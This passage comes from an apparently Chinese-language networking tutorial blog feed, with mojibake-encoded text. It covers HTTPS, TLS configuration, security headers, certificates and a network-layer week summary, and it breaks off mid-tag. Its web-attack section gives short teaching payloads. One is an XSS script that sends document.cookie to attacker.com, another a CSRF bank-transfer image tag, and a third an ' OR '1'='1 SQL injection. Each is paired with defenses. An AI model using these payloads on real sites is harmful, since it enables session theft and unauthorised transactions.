class="hljs-string">&#x27;http://attacker.com/?c=&#x27;</span>+<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br>é˜²å¾¡ï¼š<br>âœ… è¾“å…¥éªŒè¯å’Œè¿‡æ»¤<br>âœ… è¾“å‡ºç¼–ç <br>âœ… Content-Security-Policy<br>âœ… HttpOnly Cookie<br></code></pre></td></tr></table></figure><p><strong>CSRFï¼ˆè·¨ç«™è¯·æ±‚ä¼ªé€ ï¼‰</strong>ï¼š</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs routeros">åŸç†ï¼š<br>åˆ©ç”¨ç”¨æˆ·å·²ç™»å½•çŠ¶æ€ï¼Œå‘èµ·æ¶æ„è¯·æ±‚<br><br>æ”»å‡»ï¼š<br>&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;http://bank.com/transfer?to=attacker&amp;amount=1000&quot;</span>&gt;<br><br>é˜²å¾¡ï¼š<br>âœ… CSRF Token<br>âœ… SameSite Cookie<br>âœ… éªŒè¯Referer<br>âœ… äºŒæ¬¡ç¡®è®¤<br></code></pre></td></tr></table></figure><p><strong>SQLæ³¨å…¥</strong>ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs sql">åŸç†ï¼š<br>æ³¨å…¥<span class="hljs-keyword">SQL</span>ä»£ç <br><br>ç¤ºä¾‹ï¼š<br>ç”¨æˆ·åï¼š<span class="hljs-string">&#x27; OR &#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">1</span><br><span class="hljs-keyword">SQL</span>ï¼š<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> username<span class="hljs-operator">=</span><span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-keyword">OR</span> <span class="hljs-string">&#x27;1&#x27;</span><span class="hljs-operator">=</span><span class="hljs-string">&#x27;1&#x27;</span><br>ç»“æœï¼šè¿”å›æ‰€æœ‰ç”¨æˆ·<br><br>é˜²å¾¡ï¼š<br>âœ… å‚æ•°åŒ–æŸ¥è¯¢<br>âœ… ORMæ¡†æ¶<br>âœ… è¾“å…¥éªŒè¯<br>âœ… æœ€å°æƒé™<br></code></pre></td></tr></table></figure><hr><h2 id="7-HTTPSæœ€ä½³å®è·µ"><a href="#7-HTTPSæœ€ä½³å®è·µ" class="headerlink" title="7. HTTPSæœ€ä½³å®è·µ"></a>7. HTTPSæœ€ä½³å®è·µ</h2><h3 id="7-1-æœåŠ¡å™¨é…ç½®"><a href="#7-1-æœåŠ¡å™¨é…ç½®" class="headerlink" title="7.1 æœåŠ¡å™¨é…ç½®"></a>7.1 æœåŠ¡å™¨é…ç½®</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>. åªä½¿ç”¨TLS <span class="hljs-number">1</span>.<span class="hljs-number">2</span>å’ŒTLS <span class="hljs-number">1</span>.<span class="hljs-number">3</span><br>   <span class="hljs-attribute">ssl_protocols</span> TLSv1.<span class="hljs-number">2</span> TLSv1.<span class="hljs-number">3</span>;<br><br><span class="hljs-attribute">2</span>. é€‰æ‹©å¼ºåŠ å¯†å¥—ä»¶<br>   <span class="hljs-attribute">ssl_ciphers</span> &#x27;ECDHE-ECDSA-AES128-GCM-SHA256:...&#x27;;<br>   <span class="hljs-attribute">ssl_prefer_server_ciphers</span> <span class="hljs-literal">on</span>;<br><br><span class="hljs-attribute">3</span>. å¯ç”¨HSTS<br>   <span class="hljs-attribute">Strict</span>-Transport-Security: max-age=<span class="hljs-number">31536000</span>; includeSubDomains<br><br><span class="hljs-attribute">4</span>. å¯ç”¨OCSP Stapling<br>   <span class="hljs-attribute">ssl_stapling</span> <span class="hljs-literal">on</span>;<br>   <span class="hljs-attribute">ssl_stapling_verify</span> <span class="hljs-literal">on</span>;<br><br><span class="hljs-attribute">5</span>. é…ç½®ä¼šè¯ç¼“å­˜<br>   <span class="hljs-attribute">ssl_session_cache</span> shared:SSL:<span class="hljs-number">10</span>m;<br>   <span class="hljs-attribute">ssl_session_timeout</span> <span class="hljs-number">10</span>m;<br><br><span class="hljs-attribute">6</span>. ä½¿ç”¨è¯ä¹¦é“¾<br>   <span class="hljs-attribute">ssl_certificate</span> /path/to/fullchain.pem;<br>   <span class="hljs-attribute">ssl_certificate_key</span> /path/to/privkey.pem;<br></code></pre></td></tr></table></figure><h3 id="7-2-å®‰å…¨å¤´éƒ¨"><a href="#7-2-å®‰å…¨å¤´éƒ¨" class="headerlink" title="7.2 å®‰å…¨å¤´éƒ¨"></a>7.2 å®‰å…¨å¤´éƒ¨</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">1.</span> <span class="hljs-keyword">Strict</span>-Transport-<span class="hljs-keyword">Security</span>ï¼ˆHSTSï¼‰<br>   <span class="hljs-keyword">Strict</span>-Transport-<span class="hljs-keyword">Security</span>: max-age=<span class="hljs-number">31536000</span>; includeSubDomains; preload<br>   å¼ºåˆ¶ä½¿ç”¨HTTPS<br><br><span class="hljs-number">2.</span> Content-<span class="hljs-keyword">Security</span>-<span class="hljs-keyword">Policy</span>ï¼ˆCSPï¼‰<br>   Content-<span class="hljs-keyword">Security</span>-<span class="hljs-keyword">Policy</span>: <span class="hljs-keyword">default</span>-src <span class="hljs-string">&#x27;self&#x27;</span><br>   é˜²æ­¢XSSæ”»å‡»<br><br><span class="hljs-number">3.</span> X-Content-<span class="hljs-keyword">Type</span>-<span class="hljs-keyword">Options</span><br>   X-Content-<span class="hljs-keyword">Type</span>-<span class="hljs-keyword">Options</span>: nosniff<br>   é˜²æ­¢MIMEç±»å‹å—…æ¢<br><br><span class="hljs-number">4.</span> X-Frame-<span class="hljs-keyword">Options</span><br>   X-Frame-<span class="hljs-keyword">Options</span>: DENY<br>   é˜²æ­¢ç‚¹å‡»åŠ«æŒ<br><br><span class="hljs-number">5.</span> X-XSS-Protection<br>   X-XSS-Protection: <span class="hljs-number">1</span>; mode=block<br>   é˜²æ­¢XSSæ”»å‡»<br><br><span class="hljs-number">6.</span> Referrer-<span class="hljs-keyword">Policy</span><br>   Referrer-<span class="hljs-keyword">Policy</span>: <span class="hljs-keyword">no</span>-referrer-<span class="hljs-keyword">when</span>-downgrade<br>   æ§åˆ¶Refererä¿¡æ¯<br></code></pre></td></tr></table></figure><h3 id="7-3-è¯ä¹¦ç®¡ç†"><a href="#7-3-è¯ä¹¦ç®¡ç†" class="headerlink" title="7.3 è¯ä¹¦ç®¡ç†"></a>7.3 è¯ä¹¦ç®¡ç†</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> è‡ªåŠ¨ç»­æœŸ<br><span class="hljs-bullet">   -</span> ä½¿ç”¨Let&#x27;s Encrypt + Certbot<br><span class="hljs-bullet">   -</span> è®¾ç½®å®šæ—¶ä»»åŠ¡<br><span class="hljs-bullet">   -</span> é¿å…è¯ä¹¦è¿‡æœŸ<br><br><span class="hljs-bullet">2.</span> è¯ä¹¦ç›‘æ§<br><span class="hljs-bullet">   -</span> ç›‘æ§è¯ä¹¦æœ‰æ•ˆæœŸ<br><span class="hljs-bullet">   -</span> æå‰30å¤©å‘Šè­¦<br><span class="hljs-bullet">   -</span> è‡ªåŠ¨åŒ–æµç¨‹<br><br><span class="hljs-bullet">3.</span> å¤šåŸŸåç®¡ç†<br><span class="hljs-bullet">   -</span> ä½¿ç”¨é€šé…ç¬¦è¯ä¹¦<br><span class="hljs-bullet">   -</span> æˆ–SANè¯ä¹¦<br><span class="hljs-bullet">   -</span> ç»Ÿä¸€ç®¡ç†<br><br><span class="hljs-bullet">4.</span> è¯ä¹¦é€æ˜åº¦<br><span class="hljs-bullet">   -</span> æäº¤è¯ä¹¦åˆ°CTæ—¥å¿—<br><span class="hljs-bullet">   -</span> ç›‘æ§è¯ä¹¦é¢å‘<br></code></pre></td></tr></table></figure><hr><h2 id="8-å®æˆ˜é¡¹ç›®ï¼šHTTPSæœåŠ¡å™¨"><a href="#8-å®æˆ˜é¡¹ç›®ï¼šHTTPSæœåŠ¡å™¨" class="headerlink" title="8. å®æˆ˜é¡¹ç›®ï¼šHTTPSæœåŠ¡å™¨"></a>8. å®æˆ˜é¡¹ç›®ï¼šHTTPSæœåŠ¡å™¨</h2><h3 id="8-1-é¡¹ç›®éœ€æ±‚"><a href="#8-1-é¡¹ç›®éœ€æ±‚" class="headerlink" title="8.1 é¡¹ç›®éœ€æ±‚"></a>8.1 é¡¹ç›®éœ€æ±‚</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs markdown">åŠŸèƒ½éœ€æ±‚ï¼š<br><span class="hljs-bullet">1.</span> ç”Ÿæˆè‡ªç­¾åè¯ä¹¦<br><span class="hljs-bullet">2.</span> å®ç°HTTPSæœåŠ¡å™¨<br><span class="hljs-bullet">3.</span> å®ç°HTTPSå®¢æˆ·ç«¯<br><span class="hljs-bullet">4.</span> éªŒè¯è¯ä¹¦<br><span class="hljs-bullet">5.</span> åŠ å¯†é€šä¿¡<br><br>æŠ€æœ¯è¦æ±‚ï¼š<br><span class="hljs-bullet">-</span> ä½¿ç”¨Python sslæ¨¡å—<br><span class="hljs-bullet">-</span> æ”¯æŒTLS 1.2+<br><span class="hljs-bullet">-</span> è¯ä¹¦éªŒè¯<br><span class="hljs-bullet">-</span> å®‰å…¨é…ç½®<br></code></pre></td></tr></table></figure><h3 id="8-2-å·¥å…·æ¼”ç¤º"><a href="#8-2-å·¥å…·æ¼”ç¤º" class="headerlink" title="8.2 å·¥å…·æ¼”ç¤º"></a>8.2 å·¥å…·æ¼”ç¤º</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 1. ç”Ÿæˆè‡ªç­¾åè¯ä¹¦</span><br>python day20_cert_generator.py<br><br><span class="hljs-comment"># 2. å¯åŠ¨HTTPSæœåŠ¡å™¨</span><br>python day20_https_server.py --host 0.0.0.0 --port 8443<br><br><span class="hljs-comment"># 3. æµ‹è¯•HTTPSå®¢æˆ·ç«¯</span><br>python day20_https_client.py --url https://127.0.0.1:8443/<br></code></pre></td></tr></table></figure><hr><h2 id="9-ä»Šæ—¥ç»ƒä¹ "><a href="#9-ä»Šæ—¥ç»ƒä¹ " class="headerlink" title="9. ä»Šæ—¥ç»ƒä¹ "></a>9. ä»Šæ—¥ç»ƒä¹ </h2><h3 id="ç»ƒä¹ 1ï¼šè¯ä¹¦åˆ†æ"><a href="#ç»ƒä¹ 1ï¼šè¯ä¹¦åˆ†æ" class="headerlink" title="ç»ƒä¹ 1ï¼šè¯ä¹¦åˆ†æ"></a>ç»ƒä¹ 1ï¼šè¯ä¹¦åˆ†æ</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># æŸ¥çœ‹è¯ä¹¦ä¿¡æ¯</span><br>openssl x509 -<span class="hljs-keyword">in</span> cert.pem -text -noout<br><br><span class="hljs-comment"># éªŒè¯è¯ä¹¦</span><br>openssl verify -CAfile ca.pem cert.pem<br><br><span class="hljs-comment"># æŸ¥çœ‹ç½‘ç«™è¯ä¹¦</span><br>openssl s_client -connect www.baidu.com:443 -showcerts<br></code></pre></td></tr></table></figure><h3 id="ç»ƒä¹ 2ï¼šæŠ“åŒ…åˆ†æ"><a href="#ç»ƒä¹ 2ï¼šæŠ“åŒ…åˆ†æ" class="headerlink" title="ç»ƒä¹ 2ï¼šæŠ“åŒ…åˆ†æ"></a>ç»ƒä¹ 2ï¼šæŠ“åŒ…åˆ†æ</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># ä½¿ç”¨WiresharkæŠ“åŒ…</span><br><span class="hljs-comment"># 1. åˆ†æTLSæ¡æ‰‹è¿‡ç¨‹</span><br><span class="hljs-comment"># 2. æŸ¥çœ‹è¯ä¹¦äº¤æ¢</span><br><span class="hljs-comment"># 3. è§‚å¯ŸåŠ å¯†æ•°æ®</span><br><br><span class="hljs-comment"># ä½¿ç”¨tcpdump</span><br><span class="hljs-built_in">sudo</span> tcpdump -i any -w https.pcap port 443<br></code></pre></td></tr></table></figure><h3 id="ç»ƒä¹ 3ï¼šé…ç½®HTTPS"><a href="#ç»ƒä¹ 3ï¼šé…ç½®HTTPS" class="headerlink" title="ç»ƒä¹ 3ï¼šé…ç½®HTTPS"></a>ç»ƒä¹ 3ï¼šé…ç½®HTTPS</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># ä¸ºç¬¬19å¤©çš„HTTPæœåŠ¡å™¨æ·»åŠ HTTPSæ”¯æŒ</span><br><span class="hljs-comment"># 1. ç”Ÿæˆè¯ä¹¦</span><br><span class="hljs-comment"># 2. é…ç½®SSL</span><br><span class="hljs-comment"># 3. æµ‹è¯•HTTPSè¿æ¥</span><br></code></pre></td></tr></table></figure><h3 id="ç»ƒä¹ 4ï¼šå®‰å…¨æµ‹è¯•"><a href="#ç»ƒä¹ 4ï¼šå®‰å…¨æµ‹è¯•" class="headerlink" title="ç»ƒä¹ 4ï¼šå®‰å…¨æµ‹è¯•"></a>ç»ƒä¹ 4ï¼šå®‰å…¨æµ‹è¯•</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># ä½¿ç”¨SSL Labsæµ‹è¯•ç½‘ç«™å®‰å…¨æ€§</span><br><span class="hljs-comment"># https://www.ssllabs.com/ssltest/</span><br><br><span class="hljs-comment"># æ£€æŸ¥é¡¹ç›®ï¼š</span><br><span class="hljs-comment"># - è¯ä¹¦æœ‰æ•ˆæ€§</span><br><span class="hljs-comment"># - åè®®æ”¯æŒ</span><br><span class="hljs-comment"># - åŠ å¯†å¥—ä»¶</span><br><span class="hljs-comment"># - å®‰å…¨æ¼æ´</span><br></code></pre></td></tr></table></figure><hr><h2 id="10-å¸¸è§é—®é¢˜"><a href="#10-å¸¸è§é—®é¢˜" class="headerlink" title="10. å¸¸è§é—®é¢˜"></a>10. å¸¸è§é—®é¢˜</h2><p><strong>Q1ï¼šHTTPSä¼šå½±å“æ€§èƒ½å—ï¼Ÿ</strong></p><p>Aï¼š</p><ul><li>æœ‰ä¸€å®šå½±å“ï¼Œä½†å¯ä»¥æ¥å—</li><li>TLS 1.3å¤§å¹…ä¼˜åŒ–</li><li>ä½¿ç”¨HTTP&#x2F;2å¯ä»¥æå‡æ€§èƒ½</li><li>CDNå¯ä»¥åˆ†æ‹…è´Ÿè½½</li></ul><p><strong>Q2ï¼šè‡ªç­¾åè¯ä¹¦å’ŒCAç­¾åè¯ä¹¦æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ</strong></p><p>Aï¼š</p><ul><li>è‡ªç­¾åï¼šè‡ªå·±ç­¾åï¼Œä¸è¢«ä¿¡ä»»</li><li>CAç­¾åï¼šæƒå¨æœºæ„ç­¾åï¼Œè¢«ä¿¡ä»»</li><li>è‡ªç­¾ååªç”¨äºæµ‹è¯•</li><li>ç”Ÿäº§ç¯å¢ƒå¿…é¡»ç”¨CAè¯ä¹¦</li></ul><p><strong>Q3ï¼šLetâ€™s Encryptæ˜¯å¦å®‰å…¨ï¼Ÿ</strong></p><p>Aï¼š</p><ul><li>å®Œå…¨å®‰å…¨</li><li>å…è´¹ä½†ä¸é™ä½å®‰å…¨æ€§</li><li>åªæ˜¯è‡ªåŠ¨åŒ–äº†æµç¨‹</li><li>è¢«ä¸»æµæµè§ˆå™¨ä¿¡ä»»</li></ul><p><strong>Q4ï¼šHTTPSä¸€å®šå®‰å…¨å—ï¼Ÿ</strong></p><p>Aï¼š</p><ul><li>ä¸ä¸€å®š</li><li>HTTPSåªä¿è¯ä¼ è¾“å®‰å…¨</li><li>æœåŠ¡å™¨æœ¬èº«å¯èƒ½ä¸å®‰å…¨</li><li>é’“é±¼ç½‘ç«™ä¹Ÿå¯ä»¥æœ‰HTTPS</li></ul><p><strong>Q5ï¼šHTTP&#x2F;2å¿…é¡»ç”¨HTTPSå—ï¼Ÿ</strong></p><p>Aï¼š</p><ul><li>æ ‡å‡†ä¸Šä¸å¼ºåˆ¶</li><li>ä½†æ‰€æœ‰æµè§ˆå™¨éƒ½åªæ”¯æŒHTTPSç‰ˆæœ¬</li><li>å®é™…ä¸Šå¿…é¡»ç”¨HTTPS</li></ul><hr><h2 id="11-æ€»ç»“"><a href="#11-æ€»ç»“" class="headerlink" title="11. æ€»ç»“"></a>11. æ€»ç»“</h2><p>ä»Šå¤©æˆ‘ä»¬å­¦ä¹ äº†ï¼š</p><h3 id="æ ¸å¿ƒçŸ¥è¯†ç‚¹"><a href="#æ ¸å¿ƒçŸ¥è¯†ç‚¹" class="headerlink" title="æ ¸å¿ƒçŸ¥è¯†ç‚¹"></a>æ ¸å¿ƒçŸ¥è¯†ç‚¹</h3><ol><li><p><strong>HTTPSåŸºç¡€</strong>ï¼š</p><ul><li>HTTP + TLS&#x2F;SSL</li><li>è§£å†³çªƒå¬ã€ç¯¡æ”¹ã€å†’å……</li></ul></li><li><p><strong>åŠ å¯†æŠ€æœ¯</strong>ï¼š</p><ul><li>å¯¹ç§°åŠ å¯†ï¼šAES</li><li>éå¯¹ç§°åŠ å¯†ï¼šRSA</li><li>å“ˆå¸Œå‡½æ•°ï¼šSHA-256</li><li>æ•°å­—ç­¾åï¼šèº«ä»½è®¤è¯</li></ul></li><li><p><strong>TLSåè®®</strong>ï¼š</p><ul><li>TLS 1.2ï¼š2-RTTæ¡æ‰‹</li><li>TLS 1.3ï¼š1-RTTæ¡æ‰‹</li><li>åå•†ã€è®¤è¯ã€åŠ å¯†</li></ul></li><li><p><strong>æ•°å­—è¯ä¹¦</strong>ï¼š</p><ul><li>æœåŠ¡å™¨èº«ä»½è¯æ˜</li><li>CAç­¾å</li><li>ä¿¡ä»»é“¾</li></ul></li><li><p><strong>å®‰å…¨æ”»å‡»</strong>ï¼š</p><ul><li>MITMï¼šä¸­é—´äººæ”»å‡»</li><li>SSLå‰¥ç¦»</li><li>XSSã€CSRFã€SQLæ³¨å…¥</li></ul></li><li><p><strong>æœ€ä½³å®è·µ</strong>ï¼š</p><ul><li>åªç”¨TLS 1.2+</li><li>å¼ºåŠ å¯†å¥—ä»¶</li><li>HSTS</li><li>å®‰å…¨å¤´éƒ¨</li></ul></li></ol><h3 id="é‡ç‚¹å›é¡¾"><a href="#é‡ç‚¹å›é¡¾" class="headerlink" title="é‡ç‚¹å›é¡¾"></a>é‡ç‚¹å›é¡¾</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs markdown">HTTPSå·¥ä½œåŸç†ï¼š<br><span class="hljs-bullet">1.</span> å®¢æˆ·ç«¯å‘èµ·è¿æ¥ï¼ˆClientHelloï¼‰<br><span class="hljs-bullet">2.</span> æœåŠ¡å™¨è¿”å›è¯ä¹¦ï¼ˆCertificateï¼‰<br><span class="hljs-bullet">3.</span> å®¢æˆ·ç«¯éªŒè¯è¯ä¹¦<br><span class="hljs-bullet">4.</span> å¯†é’¥äº¤æ¢ï¼ˆKeyExchangeï¼‰<br><span class="hljs-bullet">5.</span> åˆ‡æ¢åˆ°åŠ å¯†é€šä¿¡<br><span class="hljs-bullet">6.</span> ä¼ è¾“åŠ å¯†æ•°æ®<br><br>æ··åˆåŠ å¯†ï¼š<br>éå¯¹ç§°åŠ å¯†ï¼ˆRSAï¼‰â†’ äº¤æ¢å¯†é’¥<br>å¯¹ç§°åŠ å¯†ï¼ˆAESï¼‰â†’ åŠ å¯†æ•°æ®<br><br>è¯ä¹¦éªŒè¯ï¼š<br>æ£€æŸ¥æœ‰æ•ˆæœŸ â†’ éªŒè¯CAç­¾å â†’ æ£€æŸ¥åŸŸå â†’ æ£€æŸ¥åŠé”€çŠ¶æ€<br></code></pre></td></tr></table></figure><h3 id="æ˜å¤©é¢„å‘Š"><a href="#æ˜å¤©é¢„å‘Š" class="headerlink" title="æ˜å¤©é¢„å‘Š"></a>æ˜å¤©é¢„å‘Š</h3><p><strong>ç¬¬21å¤©ï¼šç¬¬ä¸‰å‘¨æ€»ç»“ä¸å®æˆ˜</strong></p><p>å†…å®¹é¢„è§ˆï¼š</p><ul><li>æœ¬å‘¨çŸ¥è¯†å›é¡¾</li><li>ç»¼åˆå®æˆ˜é¡¹ç›®</li><li>æ€§èƒ½ä¼˜åŒ–æŠ€å·§</li><li>è°ƒè¯•å’Œæ’é”™</li><li>å·¥å…·å’Œèµ„æºæ¨è</li></ul><hr><p><strong>ç»§ç»­åŠ æ²¹ï¼</strong> ğŸš€</p><p>ä»Šå¤©æˆ‘ä»¬å­¦ä¹ äº†HTTPSå’ŒWebå®‰å…¨ï¼Œè¿™æ˜¯ç°ä»£äº’è”ç½‘çš„åŸºç¡€ã€‚ç†è§£HTTPSçš„å·¥ä½œåŸç†å¯¹äºå¼€å‘å®‰å…¨çš„Webåº”ç”¨è‡³å…³é‡è¦ã€‚æ˜å¤©æˆ‘ä»¬å°†è¿›è¡Œç¬¬ä¸‰å‘¨çš„æ€»ç»“ï¼Œå¹¶å®Œæˆä¸€ä¸ªç»¼åˆå®æˆ˜é¡¹ç›®ï¼</p>]]></content>
    
    
    <categories>
      
      <category>Network</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Network, Book, Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å››å‘¨æ€»ç»“ï¼šç½‘ç»œå±‚åè®®</title>
    <link href="/2025/11/10/%E5%9B%9B%E5%91%A8%E6%80%BB%E7%BB%93%EF%BC%9A%E7%BD%91%E7%BB%9C%E5%B1%82%E5%8D%8F%E8%AE%AE/"/>
    <url>/2025/11/10/%E5%9B%9B%E5%91%A8%E6%80%BB%E7%BB%93%EF%BC%9A%E7%BD%91%E7%BB%9C%E5%B1%82%E5%8D%8F%E8%AE%AE/</url>
    
    <content type="html"><![CDATA[<h1 id="ç¬¬å››å‘¨æ€»ç»“ï¼šç½‘ç»œå±‚åè®®"><a href="#ç¬¬å››å‘¨æ€»ç»“ï¼šç½‘ç»œå±‚åè®®" class="headerlink" title="ç¬¬å››å‘¨æ€»ç»“ï¼šç½‘ç»œå±‚åè®®"></a>ç¬¬å››å‘¨æ€»ç»“ï¼šç½‘ç»œå±‚åè®®</h1><h2 id="å­¦ä¹ æ—¶é—´ï¼šç¬¬22-27å¤©"><a href="#å­¦ä¹ æ—¶é—´ï¼šç¬¬22-27å¤©" class="headerlink" title="å­¦ä¹ æ—¶é—´ï¼šç¬¬22-27å¤©"></a>å­¦ä¹ æ—¶é—´ï¼šç¬¬22-27å¤©</h2><hr><h2 id="ğŸ“š-æœ¬å‘¨å­¦ä¹ å†…å®¹"><a href="#ğŸ“š-æœ¬å‘¨å­¦ä¹ å†…å®¹" class="headerlink" title="ğŸ“š æœ¬å‘¨å­¦ä¹ å†…å®¹"></a>ğŸ“š æœ¬å‘¨å­¦ä¹ å†…å®¹</h2><h3 id="Day-22ï¼šIPåè®®åŸºç¡€"><a href="#Day-22ï¼šIPåè®®åŸºç¡€" class="headerlink" title="Day 22ï¼šIPåè®®åŸºç¡€"></a>Day 22ï¼šIPåè®®åŸºç¡€</h3><ul><li>IPv4åœ°å€æ ¼å¼å’Œåˆ†ç±»</li><li>å­ç½‘åˆ’åˆ†å’ŒCIDR</li><li>NATæŠ€æœ¯</li><li>IPæ•°æ®åŒ…æ ¼å¼</li><li>å®æˆ˜ï¼šIPåœ°å€è®¡ç®—å™¨</li></ul><h3 id="Day-23ï¼šIPv6è¯¦è§£"><a href="#Day-23ï¼šIPv6è¯¦è§£" class="headerlink" title="Day 23ï¼šIPv6è¯¦è§£"></a>Day 23ï¼šIPv6è¯¦è§£</h3><ul><li>IPv6åœ°å€æ ¼å¼å’Œå‹ç¼©</li><li>IPv6ç‰¹æ€§å’Œä¼˜åŠ¿</li><li>IPv6åœ°å€ç±»å‹</li><li>IPv6è¿‡æ¸¡æŠ€æœ¯</li><li>å®æˆ˜ï¼šIPv6åœ°å€å·¥å…·</li></ul><h3 id="Day-24ï¼šICMPå’Œè¯Šæ–­å·¥å…·"><a href="#Day-24ï¼šICMPå’Œè¯Šæ–­å·¥å…·" class="headerlink" title="Day 24ï¼šICMPå’Œè¯Šæ–­å·¥å…·"></a>Day 24ï¼šICMPå’Œè¯Šæ–­å·¥å…·</h3><ul><li>ICMPåè®®åŸç†</li><li>pingå·¥ä½œæœºåˆ¶</li><li>tracerouteå®ç°</li><li>ICMPv6</li><li>å®æˆ˜ï¼šç½‘ç»œè¯Šæ–­å·¥å…·</li></ul><h3 id="Day-25ï¼šARPåè®®å’Œé“¾è·¯å±‚"><a href="#Day-25ï¼šARPåè®®å’Œé“¾è·¯å±‚" class="headerlink" title="Day 25ï¼šARPåè®®å’Œé“¾è·¯å±‚"></a>Day 25ï¼šARPåè®®å’Œé“¾è·¯å±‚</h3><ul><li>ARPå·¥ä½œåŸç†</li><li>ARPç¼“å­˜ç®¡ç†</li><li>ARPå®‰å…¨é—®é¢˜</li><li>MACåœ°å€å’Œä»¥å¤ªç½‘å¸§</li><li>VLANåŸºç¡€</li><li>å®æˆ˜ï¼šARPå·¥å…·å¥—ä»¶</li></ul><h3 id="Day-26ï¼šè·¯ç”±åè®®åŸºç¡€"><a href="#Day-26ï¼šè·¯ç”±åè®®åŸºç¡€" class="headerlink" title="Day 26ï¼šè·¯ç”±åè®®åŸºç¡€"></a>Day 26ï¼šè·¯ç”±åè®®åŸºç¡€</h3><ul><li>è·¯ç”±è¡¨å’Œè·¯ç”±æŸ¥æ‰¾</li><li>é™æ€è·¯ç”±é…ç½®</li><li>åŠ¨æ€è·¯ç”±åè®®</li><li>RIPåè®®è¯¦è§£</li><li>OSPFåŸºç¡€</li><li>å®æˆ˜ï¼šè·¯ç”±è¡¨æ¨¡æ‹Ÿå™¨</li></ul><h3 id="Day-27ï¼šç»¼åˆå®æˆ˜"><a 